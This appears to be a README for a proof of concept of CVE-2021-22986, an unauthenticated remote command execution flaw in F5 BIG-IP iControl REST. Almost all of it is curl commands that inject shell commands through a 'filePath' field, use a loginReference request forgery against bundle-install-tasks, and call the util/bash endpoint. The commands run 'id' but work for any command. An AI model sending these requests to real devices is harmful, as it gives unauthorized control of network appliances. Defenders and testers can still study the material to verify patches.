# CVE-2021-22986-Poc
This is a Poc for BIGIP iControl unauth RCE 

POC :~

curl -ksu admin:[redacted] https://192.168.123.134/mgmt/tm/access/bundle-install-tasks -d '{"filePath":"`id`"}' | jq .

 curl -ksu : https://192.168.123.134/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}' | jq .
 
 curl -su admin: -H "Content-Type: application/json" http://localhost:8100/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}' | jq .
 
 
 Reference:~
 https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
